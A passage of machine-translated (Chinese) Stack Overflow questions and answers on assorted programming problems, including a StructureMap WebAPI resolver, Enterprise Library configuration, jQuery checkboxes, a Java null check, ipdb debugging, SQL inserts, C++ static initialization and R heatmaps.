    protected readonly IContainer _container;

    public _DependencyScope(IContainer container) {
        if (container == null)
            throw new ArgumentNullException("container");

        _container = container;
    }

    public override object GetService(Type serviceType) {
        if (serviceType == null)
            return null;

        try {
            return (serviceType.IsAbstract || serviceType.IsInterface)
                ? _container.TryGetInstance(serviceType)
                : _container.GetInstance(serviceType);
        } catch {
            return null;
        }
    }

    protected override object DoGetInstance(Type serviceType, string key) {
        if (string.IsNullOrEmpty(key))
            return _container.TryGetInstance(serviceType);

        return _container.TryGetInstance(serviceType, key);
    }

    protected override IEnumerable<object> DoGetAllInstances(Type serviceType) {
        return _container.GetAllInstances<object>().Where(s => s.GetType() == serviceType);
    }

    public IEnumerable<object> GetServices(Type serviceType) {
        return _container.GetAllInstances<object>().Where(s => s.GetType() == serviceType);
    }

    public void Dispose() {
        //_container.Dispose();
    }

} 
```

要将这些类与 WebAPI 挂钩，您需要将以下内容添加到`Global.asax`：

```
GlobalConfiguration.Configuration.DependencyResolver = 
    new _DependencyResolver(ObjectFactory.Container); 
```

无论是在您的 中`Global.asax`还是在您的 中`Bootstrapper`，您都将添加以下内容：

```
ObjectFactory.Initialize(x => {
    x.Scan(scanner => scanner.AddAllTypesOf<ApiController>());
}); 
```

这会将您的`StructureMap`实现设置为使用堆栈的预先存在的注入结构 - 这应该可以避免您遇到的问题。

# c# - 企业库迁移 - 您必须配置容器以提供此值

> ID：12646658
> 
> 赞同：4
> 
> 时间：2012-09-28T20:03:11.967
> 
> 标签：c#, sql-server-ce, enterprise-library-5

我不知道还有谁可以寻求帮助。

在我的公司，我们正在迁移系统。2.0 到 3.5 净

我们使用企业库 3.1，我们正在迁移到 5.0

我使用了配置文件的工具

编译没问题，但是当我运行时，我收到以下消息：

**尝试获取类型数据库实例时发生激活错误，键“MrvFramework”**

**依赖项解析失败，类型 =“Microsoft.Practices.EnterpriseLibrary.Data.Database”，名称 =“MrvFramework”。异常发生时：解决时。**

**异常是： InvalidOperationException - 无法构造类型数据库。您必须配置容器以提供此值。**

**发生异常时，容器为：正在解析 Microsoft.Practices.EnterpriseLibrary.Data.Database**

我花了很多时间上网：

我做了这个测试：

*   项目中引用了企业库所需的所有DLL
*   `var database = DatabaseFactory.CreateDatabase(MrvFramework)`
*   `var database = EnterpriseLibraryContainer.Current.GetInstance<Database>(MrvFramework)`
*   `var database = new SqlDatabase(MrvFramework)`

这是我的 app.config（片段代码）

```
<section name="dataConfiguration" type="Microsoft.Practices.EnterpriseLibrary.Data.Configuration.DatabaseSettings, Microsoft.Practices.EnterpriseLibrary.Data, Version=5.0.414.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" requirePermission="true" />

<dataConfiguration defaultDatabase="MRVFramework"/>
<connectionStrings>
   <add name="MRVFramework" connectionString="Data Source=H:\MRV\Projetos\MRV Framework\Branch\Update SqlServerCe\MRV.Framework.Seguranca.Console\MRVFramework.sdf;Persist Security Info=True" providerName="System.Data.SqlClient"/>
</connectionStrings> 
```

这是我的 machine.config 文件

```
<DbProviderFactories>
  <add name="Odbc Data Provider" invariant="System.Data.Odbc" description=".Net Framework Data Provider for Odbc" type="System.Data.Odbc.OdbcFactory, System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <add name="OleDb Data Provider" invariant="System.Data.OleDb" description=".Net Framework Data Provider for OleDb" type="System.Data.OleDb.OleDbFactory, System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <add name="OracleClient Data Provider" invariant="System.Data.OracleClient" description=".Net Framework Data Provider for Oracle" type="System.Data.OracleClient.OracleClientFactory, System.Data.OracleClient, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <add name="SqlClient Data Provider" invariant="System.Data.SqlClient" description=".Net Framework Data Provider for SqlServer" type="System.Data.SqlClient.SqlClientFactory, System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <add name="Microsoft SQL Server Compact Data Provider" invariant="System.Data.SqlServerCe.3.5" description=".NET Framework Data Provider for Microsoft SQL Server Compact" type="System.Data.SqlServerCe.SqlCeProviderFactory, System.Data.SqlServerCe, Version=3.5.1.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91" />
</DbProviderFactories> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-06-11T09:36:52.030

将此代码添加到您的 web.config

```
<runtime>
   <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
     <qualifyAssembly partialName="Microsoft.Practices.EnterpriseLibrary.Data" fullName="Microsoft.Practices.EnterpriseLibrary.Data, Version=5.0.414.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"/>
   </assemblyBinding>
</runtime> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-18T02:10:43.233

我在执行以下代码时遇到了同样的异常；

`Database db = DatabaseFactory.CreateDatabase();`

将代码更新为后解决的异常

```
Database db = DatabaseFactory.CreateDatabase("Connection String"); // config file string 
```

# javascript - 复选框序列化问题

> ID：12646660
> 
> 赞同：0
> 
> 时间：2012-09-28T20:03:26.740
> 
> 标签：javascript, jquery, checkbox

我有一个带有多个复选框的网页（下面其中一个的代码）：

```
<div>
        <label for="ViewAsWebpage">
            {{#if this.ViewAsWebpage}}
                <input type="hidden" id="ViewAsWebpage" name="ViewAsWebpage" value="true"/> 
                <input id="chkViewAsWebpage" type="checkbox" class="enable-checkbox" checked /> 
            {{else}}
                <input type="hidden" id="ViewAsWebpage" name="ViewAsWebpage" value="false"/> 
                <input id="chkViewAsWebpage" type="checkbox" class="enable-checkbox" /> 
            {{/if}}
            <span>View as Webpage</span>
        </label>
    </div> 
```

我有一个事件处理程序来处理更改事件（对于所有复选框）：

```
changeCheckboxValue: function(e) {
            var target = this.$(e.target);
            var id = this.$(e.target).siblings().attr('id');

            $(id).val(target.is(':checked') ? 'true' : 'false'); 
```

上述事件效果很好并设置了真/假值。

但是，当我序列化表单（在提交时发布表单值）时，这些更新的值不会反映。有人可以让我知道我错过了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T21:48:40.027

问题是缺少#。

固定，通过改变：

```
$(id).val(target.is(':checked') ? 'true' : 'false'); 
```

至

```
$('#' + id).val(target.is(':checked') ? 'true' : 'false'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:16:53.157

使用[prop()](http://api.jquery.com/prop/)设置选中的属性：

```
$(id).prop("checked", true); 
```

或者

```
$(id).prop("checked", false); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T20:19:35.033

我认为问题在于您`id`对所有`hidden`字段都使用相同的。

让我们回顾一下这段代码：

```
changeCheckboxValue: function(e) {
    var target = this.$(e.target);    // get the checkbox that is clicked
    var id = this.$(e.target).siblings().attr('id');  // get checkbox's siblings' id
                                             // so id == 'ViewAsWebpage'
    $(id).val(target.is(':checked') ? 'true' : 'false');  // HERE!!
              // $(id) returns all the hiddens that have id == 'ViewAsWebpage' 
```

因此，所有隐藏项的值都会发生数次变化。它们最终都会是“真”或“假”。

我认为您应该选择这样的隐藏字段。

```
changeCheckboxValue: function(e) {
    var target = $(e.target);
    var hidden = target.prev();

    hidden.val(target.is(':checked') ? 'true' : 'false'); 
```

# java - Java：BufferedReader 和 NullPointerException

> ID：12646664
> 
> 赞同：0
> 
> 时间：2012-09-28T20:04:00.857
> 
> 标签：java, nullpointerexception, bufferedreader

我的代码按预期工作，当我输入此`if`语句时出现问题：

```
if (sList.get(i).equals(null)){break;} 
```

程序崩溃并显示以下调试信息 (NullPointerException)：

> 在 sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39) 在 sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) 在 sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) 在 HangmanLexicon.(HangmanLexicon.java:51) 的 java.lang.NullPointerException (NativeConstructorAccessorImpl.java:39) 在 sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:27) 在 java.lang.reflect.Constructor.newInstance(Constructor.java:513) 在 java.lang.Class.newInstance0(Class.java:355) 在 java.lang.Class.newInstance(Class. java:308) 在 sun.applet.AppletPanel.createApplet(AppletPanel.java:807) 在 sun.applet.AppletPanel.runLoader(AppletPanel.java:714) 在 sun.applet.AppletPanel.run(AppletPanel.java:368) 在java.lang.Thread.run(Thread.java:680)

这是所有代码（是的，我知道它很乱，在学习新东西时看起来就是这样）：

```
public HangmanLexicon() 
{
/* 1\. Open the data file HangmanLexicon.txt using a 
 * BufferedReader that will allow you to read it line by line. */
String readWord = "";

 try
 {
 BufferedReader rd = new BufferedReader (new FileReader ("ShorterLexicon.txt"));

    while (true)
    {
        readWord = rd.readLine();
        println(readWord);
        sList.add(readWord);
        if (readWord == null){
            println("Shit has hit the fan.");
            break;}
    }
    rd.close();
 }
 catch (IOException ex)
 {
     println ("Shit has hit the fan.");
     throw new ErrorException(ex);
 }

 println("readWord: "+ readWord);
/* 2\. Read the lines from the file into an ArrayList. */
 for (int i = 0; i < sList.size(); i++)
    {
        if (sList.get(i).equals (null)){println("done.");}
        println("get: "+sList.get(i) + " pos: " + i);
    }

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T20:05:02.823

不要以`null`这种方式进行测试，而是使用：

```
if (sList.get(i) == null) 
```

您的使用`equals`有一个问题，如果 a的结果是`NullPointerException`自然会出现: 因为您不能在 . 上调用方法。`get``null``null`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-28T20:05:39.297

似乎`sList.get(i)`是并且您正在`null`调用导致.`equals()``null``NullPointerException`

利用

```
if (sList.get(i)== null) 
```

代替

```
if (sList.get(i).equals (null)) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-28T20:07:41.837

当你`null`的数组中有一个值时，你不能调用`equal`函数，只需与 null 比较

```
if(sList.get(i) == null){
    println("done.");
}else{
    println("get: "+sList.get(i) + " pos: " + i);
} 
```

我建议你在循环 中使用`ready`类的功能`BufferedReader``while`

```
while(rd.ready()){
   // read 
} 
```

见[准备好（）](http://docs.oracle.com/javase/6/docs/api/java/io/BufferedReader.html#ready%28%29)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-07-17T03:02:10.883

bufferedReader 将 String 的值存储为“null”，如果 br.readLine() 为空，则不为 null

所以尝试检查

```
(!Stringval.equalisIgnoreCase("null")) 
```

代替

```
(Stringval != null) or (Stringval.equalsIgnoreCase(null)) 
```

# xcode - 播放视频以启动应用程序 xcode

> ID：12646665
> 
> 赞同：1
> 
> 时间：2012-09-28T20:04:05.253
> 
> 标签：xcode, ios5, media-player, mpmovieplayercontroller

播放视频以启动应用程序

我有这个代码，我看不到视频，我可以听到音频。

谁能解释为什么？

```
-(void)awakeFromNib
{

    NSURL *url2 = [NSURL fileURLWithPath:[[NSBundle mainBundle] pathForResource:@"tecnolitevideo_1" ofType:@"mov"]];

    moviePlayer =  [[MPMoviePlayerViewController alloc]
                    initWithContentURL:url2];
    [moviePlayer presentMoviePlayerViewControllerAnimated:moviePlayer];
    [moviePlayer.moviePlayer play];

    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(moviePlayerPlaybackStateChanged:) name:MPMoviePlayerPlaybackStateDidChangeNotification object:nil];

}

-(void)moviePlayerPlaybackStateChanged:(NSNotification *)notification {
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-24T22:07:03.677

```
 - (void)viewDidLoad
    {

    NSURL* url = [[NSBundle mainBundle] URLForResource:@"3" withExtension:@"mov"];

            m_player = [[MPMoviePlayerController alloc] initWithContentURL:url];
            [m_player.backgroundView setBackgroundColor:[UIColor blackColor]];
            [m_player.view setBackgroundColor:[UIColor blackColor]];
            [m_player setControlStyle:MPMovieControlStyleNone];
            [[m_player view] setFrame:[self.view bounds]];

            [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(moviePlayBackDidFinish:) name:MPMoviePlayerPlaybackDidFinishNotification object:nil];

            [m_player play];

            [self.view addSubview:[m_player view]];

}

- (void) moviePlayBackDidFinish:(NSNotification*)_notification
{

    [[NSNotificationCenter defaultCenter] removeObserver:self
                                                    name:MPMoviePlayerPlaybackDidFinishNotification
                                                  object:nil];

      [m_player.view removeFromSuperview];
      [m_player stop];

    m_player = nil;
} 
```

我试试这个，效果很好！！！

# .htaccess - 允许访问 htaccess 中的某些目录

> ID：12646668
> 
> 赞同：2
> 
> 时间：2012-09-28T20:04:09.137
> 
> 标签：.htaccess, directory

在 htaccess 中，我使用以下代码阻止目录浏览。

```
# directory browsing
Options All -Indexes 
```

但是，我希望人们可以访问某个文件夹，假设该文件夹称为图片，因此该文件夹位于 mysite.com/pictures。

如何授予对该文件夹/目录的访问权限，但阻止其余部分？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T20:08:55.700

使用以下行将 .htaccess 文件放入您的图片文件夹：

```
Options Indexes 
```

（或“+Indexes”，这是相同的。）这应该照顾它，因为子 .htaccess 文件会覆盖父母。

从您的问题来看，您不清楚“选项索引”的局限性。这不会“阻止”对目录的访问；它只是关闭自动生成的目录列表。知道文件名后，无论是否启用索引，任何人都可以访问该资源。

# c# - TryGetObjectByKey 未在 .net 4.5 中编译

> ID：12646669
> 
> 赞同：2
> 
> 时间：2012-09-28T20:04:14.613
> 
> 标签：c#, .net, entity-framework

我有以下代码可以很好地保存 .Net 4 / EF 4 项目中的分离对象。我想在新的 .Net 4.5 / EF 5 项目中使用该代码。我复制了它，现在它给了我一个编译错误：

“MyEntities 不包含 'TryGetObjectByKey' 的定义，并且找不到接受 MyEntities 类型的第一个参数的扩展方法 'TryGetObjectByKey'（您是否缺少 using 指令或程序集引用？）”

据称它位于引用的 System.Data.Entity 程序集 (.dll) 的 System.Data.Objects 命名空间中（所以我有一个使用它）。

```
public bool UpdateChanged(IEntityWithKey DetachedObject = null) {
    bool Result = false;

    try {
        using (MyEntities db = new MyEntities()) {
            if (DetachedObject != null) {
                object Original = null;

                if (db.TryGetObjectByKey(DetachedObject.EntityKey, out Original))
                    db.ApplyCurrentValues(DetachedObject.EntityKey.EntitySetName, DetachedObject);
            } // if they want to Update an Entity

            db.SaveChanges();
            Result = true;
        } // using the database
    } catch (Exception e) {

    } // try-catch

    return Result;
} // UpdateChanged - Method 
```

根据此链接，它应该可以工作：http: [//msdn.microsoft.com/en-us/library/bb738728.aspx](http://msdn.microsoft.com/en-us/library/bb738728.aspx)

你能帮忙吗？

**更新/解决方案：**

根据下面@Rowan 的回答，我只是将我的 Save 方法修改为如下所示，而不是创建一个采用 Detached 对象的 UpdateChanged 方法：

```
using (MyEntities db = new MyEntities()) {
    if (o.ID > 0) {
        // Existing Owner
        db.Owners.Attach(o);
        db.Entry(o).State = EntityState.Modified;
        db.Entry(o.Address).State = EntityState.Modified;
    } else {
        // New Owner
        db.Owners.Add(o);
    } // if this is a New Owner

    db.SaveChanges();
} // using the database 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-01T16:52:26.490

TryGetObjectByKey is a method on ObjectContext. Starting in Visual Studio 2012 new models will generate a DbContext based context by default (DbContext is designed to be a simpler and more intuitive API surface). Existing models will keep generating ObjectContext unless you choose to swap to DbContext. You can also [revert back to ObjectContext](http://msdn.microsoft.com/en-us/data/jj556581) for new models.

You can always get at the underlying ObjectContext using ((IObjectContextAdapter)db).ObjectContext.TryGetObjectByKey(...).

# python - 步入 IPython 中的函数

> ID：12646670
> 
> 赞同：39
> 
> 时间：2012-09-28T20:04:16.597
> 
> 标签：python, debugging, ipython, pdb

有没有办法进入 ipython 中函数的第一行。我想像这样的东西：

```
%step foo(1, 2) 
```

它运行`ipdb`并在`foo`.

如果我现在想这样做，我必须转到函数的源代码并添加`import ipdb; ipdb.set_trace()`一行。

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-09-28T20:36:32.717

ipdb 从今年早些时候的 0.7 开始就支持 runcall、runeval 和 run。你可以像这样使用它`pdb.runcall`：

```
In [1]: def foo(a, b):
   ...:     print a + b
   ...:

In [2]: import ipdb

In [3]: ipdb.runcall(foo, 1, 2)
> <ipython-input-1-2e565fd9c4a4>(2)foo()
      1 def foo(a, b):
----> 2     print a + b
      3

ipdb> 
```

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2018-09-28T12:38:00.167

您要求的 IPython 魔法现在已使用较新的版本实现： [https ://stackoverflow.com/a/46333421/4374441](https://stackoverflow.com/a/46333421/4374441)

您只需键入`%debug foo(1, 2)`then`s`即可进入该功能。

# sql-server-2008 - 如何有条件地插入

> ID：12646679
> 
> 赞同：0
> 
> 时间：2012-09-28T20:05:12.627
> 
> 标签：sql-server-2008, insert, duplicates

我创建了一个临时表#tbl(account, last_update)。我有两个来自不同来源（可能是来自不同数据库的表）的插入以插入具有最后更新日期的帐户。例如

```
create table #tbl ([account] numeric(18, 0), [last_update] datetime)

insert into #tbl(account , last_update)
select table1.account, max(table1.last_update)
from table1 join…
group by table1.account

insert into #tbl(account , last_update)
select table2.account, max(table2.last_update)
from table2 join…
group by table2.account 
```

问题是这可能会导致表#tbl 中的帐户重复。我要么必须在每次插入期间避免它，要么在两次插入后删除重复项。此外，如果有两个不同的 last_update 帐户，我希望 #tbl 具有最新的 last_update。我如何实现这个条件插入？哪一个会有更好的表现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:19:39.553

你认为你可以将你的查询重写为：

```
create table #tbl ([account] numeric(18, 0), [last_update] datetime)

insert into #tbl(account , last_update)
  select theaccount, MAX(theupdate) from 
  (
    select table1.account AS theaccount, table1.last_update AS theupdate
    from table1 join…
     UNION ALL
    select table2.account AS theaccount, table2.last_update AS theupdate
    from table2 join…
   ) AS tmp GROUP BY theaccount 
```

UNION ALL 将为您构建 1 个结合 table1 + table2 记录的唯一表。从那里，您可以像普通表一样行事，这意味着您可以使用“分组依据”找到每条记录的最大 last_update

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T13:27:52.767

```
插入 #tbl(account , last_update)
  选择帐户，last_update
     从
      (
    select a.* from #table1 a where
     last_update in（从 #table1 b 中选择前 1 个 last_update
      在哪里
        a.account = b.account
         按 last_update 顺序排序）
         联盟
    select a.* from #table2 a where
     last_update in( select top 1 last_update from #table2 b
      在哪里
        a.account = b.account
         按 last_update 顺序排序）
      ) 作为 tmp
```

# visual-studio-2008 - C++ 静态初始化惨败是否适用于类层次结构？

> ID：12646681
> 
> 赞同：1
> 
> 时间：2012-09-28T20:05:28.543
> 
> 标签：visual-studio-2008, visual-c++, static-initialization

我在静态初始化中遇到崩溃（调试断言失败：VC++ 2008 中的无效 CRT 堆指针），我不确定我是否理解原因。

我已经阅读了[C++ FAQ中有关](http://www.parashift.com/c++-faq/index.html "C++ FAQ")[静态初始化惨败](http://www.parashift.com/c++-faq/static-init-order.html "静态初始化命令惨败")的所有内容，并且我想我已经掌握了它——我不明白为什么会发生这种情况，或者为什么会出现这种惨败。

这就是这种情况（为简洁起见，省略了大多数非静态成员）。我有一个类 A，在 Ah 中定义：

```
class A {
public:
    virtual ~A() { }

    virtual void do_something();
}; 
```

然后，我有一个类 C，它有一个嵌套类 B，它是 A 的子类。C 还包含 B 类型的私有静态成员：

```
class C {
public:
    void do_the_C_thing();

private:
    class B : public A {
    public:
        virtual void do_something();
    };

    static B my_personal_B;
}; 
```

最后是 C 的实现文件 C.cpp，其中包含 my_personal_B 的存储单元：

```
C::B my_personal_B;

C::C() {
}

C::do_the_C_thing() {
    // [...]
    my_personal_B.do_something();
    // [...]
}

void C::B::do_something() {
    // overridden do_something for C's private B class
} 
```

许多类都重复这种模式，每个类都有一个继承自 A 的嵌套类。通过多次代码修订，这一切都运行得完美无缺，但最近应用程序因以下特定错误消息而崩溃：

> 调试断言失败！
> 
> 程序：
> [已编辑].exe
> 文件：f:\dd\vctools\crt_bld\self_x86\crt\src\dbgheap.c
> 行：1511
> 
> 表达式：_CrtIsValidHeapPointer(pUserData)

如果单击进行调试，则会在 C.cpp 中显示定义静态成员的行。

这看起来不像是静态惨败，因为没有任何静态引用 my_personal_B，A 和 B 除了默认构造函数之外都没有任何东西，因此不可能引用其他尚未初始化的静态对象。我理解惨败的方式是，当一个静态对象引用另一个尚未初始化的静态对象时，它就发生了。

不过，如果我将静态成员更改为首次使用时初始化的方法，崩溃似乎就消失了。

所以问题是，为什么会崩溃？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:43:22.257

A类具有虚函数。这意味着编译器会生成一个名为*vtable*的静态对象来保存指向成员函数的指针。因此，尽管您没有在 A 类中定义任何静态对象，但编译器必须这样做。B 类依赖于该 vtable（对于 A 的虚拟析构函数，如果没有别的）。显然，初始化代码现在正试图在构造 A 的 vtable 之前创建 B 类型的对象。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-28T20:11:29.340

伙计，你为什么首先依赖静态初始化？你能说“设计错误”吗？

建议：

如果你不能改变设计，至少一定要设置一个标志“bInitialized”，这样依赖的客户就可以检查你的对象是否真的被初始化了，并优雅地失败。

恕我直言...

# php - 如何从其他数组中取出值

> ID：12646683
> 
> 赞同：2
> 
> 时间：2012-09-28T20:05:34.990
> 
> 标签：php, arrays

> **可能重复：**
> [如何从 PHP 中的数组中删除值？](https://stackoverflow.com/questions/1288148/how-to-remove-values-from-an-array-in-php)

我有这个

```
$arr1 = array('orange','banana');
$arr2 = array('broccli','tomato','mixedvegies','orange','veg2'); 
```

我将如何从 $arr2 中获取完整的 $arr1 以便 arr2 具有

```
$arr2 = array('broccli','tomato','mixedvegies','veg2'); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T20:10:09.133

```
array_diff($arr2, $arr1); 
```

array_diff 返回一个数组，其中所有元素*不在*第二个（或第三个，第四个......可选参数）中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T20:10:24.487

您可以为此使用[array_diff ：](http://php.net/manual/en/function.array-diff.php)

```
$uniqueItems = array_diff($arr2, $arr1); 
```

# clojure - 如何递归使用 clojure.core/bean？

> ID：12646684
> 
> 赞同：6
> 
> 时间：2012-09-28T20:05:35.660
> 
> 标签：clojure

所以我认为[clojure.core/bean](http://clojuredocs.org/clojure_core/clojure.core/bean)非常接近我想要的，但我正在使用具有嵌套 bean 的 Java 应用程序，因此我最终得到这样的映射：

```
{:month-total 3835.0 :name "Jan's Meat Diner" :owners #<BarOwner[] [Lcom.fancypants.BarOwner;@1fb332d} 
```

如何，我如何`bean`递归调用 Java 对象，以便我可以让我的想象`BarOwner`对象也将自己作为地图发出：

```
{:month-total 3835.0 :name "Jan's Meat Diner" :owners { [:name "Jack"] [:name "Jill"] } } 
```

## 编辑 1

我发现[`clojure/java.data`](https://github.com/clojure/java.data)并且`from-java`可能比`bean`.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-17T18:24:17.533

虽然这可能不是“如何递归使用 bean”的理想答案，但使用 Clojure 社区站点下更多更丰富的贡献库确实解决了这个问题。具体来说

## [clojure/java.data](https://github.com/clojure/java.data)

提供简单的递归 bean 解析，并且可以配置为专门在多毛的情况下处理 java 类型。我会向其他想要使用`bean`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:02:22.837

找出什么是豆，什么不是豆是非常棘手的。这似乎对作为列表的 bean 和属性中的 bean 有效。可能您会想要向`probably-bean?`函数添加更多类，并且可能需要对映射属性的一些支持。

```
(defn probably-bean? [o]
   (and (not (coll? o))
         ((complement #{Class Long String clojure.lang.Keyword}) (class o))))

(defn transf [o]
    (cond
            (instance? java.util.List o) (into [] (map transf o))
            (probably-bean? o) (into {} (seq (bean o)))
            :else o))

(defn to-bean [o]
    (clojure.walk/prewalk #(transf %) o)) 
```

# python - 索引数组

> ID：12646690
> 
> 赞同：3
> 
> 时间：2012-09-28T20:05:56.157
> 
> 标签：python

我发现自己经常在 Python 中从平面列表中创建索引列表。这是一项非常常见的任务，我想知道是否有一个标准的实用程序可以用于它。

上下文是这样的：给定一个数组，我需要使用一些用于分组的键来创建一个较小数组的字典。

例如：
`["Andy","Alice","Bob","Beth","Charlie"]`变成
`{"A":["Andy","Alice"],"B":["Bob","Beth"],"C":["Charlie"]}`

我的解决方案如下所示：

```
def make_index(data,key,value=lambda x:x):
    d={}
    for item in data:
        k = key(item)
        v = value(item)
        try: d[k].append(v)
        except KeyError: d[k]=[v]
    return d 
```

这很简单，但我是否正在重新发明在其他地方实施得更好的东西？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T20:09:31.460

您可以使用 a 更简单地执行相同的操作[`defaultdict`](http://docs.python.org/library/collections.html#collections.defaultdict)：

```
from collections import defaultdict

def make_index(data,key,value=lambda x:x):
    d=defaultdict(list)
    for item in data:
        d[key(item)].append(value(item))
    return d 
```

使用 a`defaultdict`比使用 快`.setdefault()`，这是另一种选择。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-28T20:13:34.530

不知道为什么`itertools`答案被删除，但我自己写了一个：

```
from itertools import groupby
def make_index(data, key = lambda x: x[0]):
    return {key: list(gr) for key, gr in 
        groupby(sorted(data, key=key), key=key)}

In [3]: make_index(["Andy","Alice","Bob","Beth","Charlie"])
Out[3]: {'A': ['Andy', 'Alice'], 'B': ['Bob', 'Beth'], 'C': ['Charlie']}

In [4]: make_index(["Andy","Alice","Bob","Beth","Charlie"], key=lambda x: len(x))
Out[4]: {3: ['Bob'], 4: ['Andy', 'Beth'], 5: ['Alice'], 7: ['Charlie']} 
```

# r - 试图确定为什么我的热图使用 heatmap.2 并在 R 中使用中断是不对称的

> ID：12646691
> 
> 赞同：4
> 
> 时间：2012-09-28T14:46:34.553
> 
> 标签：r, matrix, cluster-analysis, data-visualization, heatmap

我正在尝试对蛋白质 dna 相互作用数据集进行聚类，并使用 R 包 gplots 中的 heatmap.2 绘制热图。我的矩阵是对称的。
这是我在通过 pearson 运行后使用的数据集的副本：[DataSet](http://pastebin.com/JQ1wgVwD)

这是我生成这些图的完整过程：在我的案例 pearson 中使用一些相关性生成距离矩阵，然后将该矩阵传递给 R 并在其上运行以下代码：

```
library(RColorBrewer);
library(gplots);
library(MASS);
args <- commandArgs(TRUE);
matrix_a <- read.table(args[1], sep='\t', header=T, row.names=1);
mtscaled <- as.matrix(scale(matrix_a))
# location <- args[2];
# setwd(args[2]);
pdf("result.pdf", pointsize = 15, width = 18, height = 18)
mycol <- c("blue","white","red")
my.breaks <- c(seq(-5, -.6, length.out=6),seq(-.5999999, .1, length.out=4),seq(.100009,5, length.out=7))
#colors <- colorpanel(75,"midnightblue","mediumseagreen","yellow") 
result <- heatmap.2(mtscaled, Rowv=T, scale='none', dendrogram="row", symm = T, col=bluered(16), breaks=my.breaks)
dev.off() 
```

我遇到的问题是，一旦我使用中断来帮助我控制颜色分离，热图看起来不再对称。

这是我使用中断之前的热图，您可以看到热图看起来是对称的： ![无间断](../Images/aa6b74f8b206e1fac19c8f466049b494.png)

这是使用休息时的热图： ![有休息](../Images/caca7843cfc0c5255ee33361279de1a7.png)

我已经使用了序列的截止点，以确保例如一个序列不会在另一个序列开始的地方结束，但我无法解决这个问题。我想利用休息时间来帮助更多地展示集群。

这是它应该是什么样子的示例，此图像是使用集群制造商制作的： ![在此处输入图像描述](../Images/ce073351bce6541d2897e7e5fcb078af.png)

我不希望它看起来与此相同，但如果我的热图更对称并且我在集群方面有更好的定义，我会喜欢它。该图像是使用相同的数据创建的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-02T14:14:28.963

经过一番调查，我注意到在通过热图或 heatmap.2 运行我的矩阵后，值正在发生变化，例如从提供的数据集中获取的交互

pacdh-2 和 pegg-2

在将矩阵发送到热图之前给出了 0.0250313 的值。
之后，我使用 result$carpet 查看了矩阵值，然后这些值是

-0.224333135 -1.09805379

对于两个交互

因此，我决定根据聚类矩阵中的树状图对原始矩阵进行重新排序，以确保这些值是相同的。我使用以下堆栈溢出问题寻求帮助： [热图中的行顺序？](https://stackoverflow.com/questions/5320814/order-of-rows-in-heatmap)

这是用于此的代码：

```
rowInd <- rev(order.dendrogram(result$rowDendrogram))
colInd <- rowInd
data_ordered <- matrix_a[rowInd, colInd] 
```

然后我使用另一个程序“matrix2png”来绘制热图： ![在此处输入图像描述](../Images/5c35e7b2fe3c9f75375dac09ef6586e2.png)

我仍然必须使用颜色，但至少现在热图是对称的和聚集的。

更深入地研究它，问题似乎是`scale(matrix_a)`当我将代码更改为`mtscaled <- as.matrix(matrix_a)`现在看起来对称的结果时我正在运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T22:33:44.217

我当然不是那种尝试从那个奇怪的数据对象中复制和测试它而没有可以正确读取它的代码的人，但这里有一个想法：

```
 ..., col=bluered(20)[4:20], ... 
```

这是另一个虽然应该返回完整的红色，但上述策略不会：

```
 shift.BR<- colorRamp(c("blue","white", "red"), bias=0.5 )((1:16)/16)
 heatmap.2( ...., col=rgb(shift.BR, maxColorValue=255), .... ) 
```

或者你可以使用这个向量：

```
> rgb(shift.BR, maxColorValue=255)
 [1] "#1616FF" "#2D2DFF" "#4343FF" "#5A5AFF" "#7070FF" "#8787FF" "#9D9DFF" "#B4B4FF" "#CACAFF" "#E1E1FF" "#F7F7FF"
[12] "#FFD9D9" "#FFA3A3" "#FF6C6C" "#FF3636" "#FF0000" 
```

有一个有点类似的问题（今天也是如此），它要求从 -1 到 3 的一组值的蓝色到红色的解决方案，中间是白色。这是该问题的代码和输出：

```
test <- seq(-1,3, len=20)
shift.BR <- colorRamp(c("blue","white", "red"), bias=2)((1:20)/20)
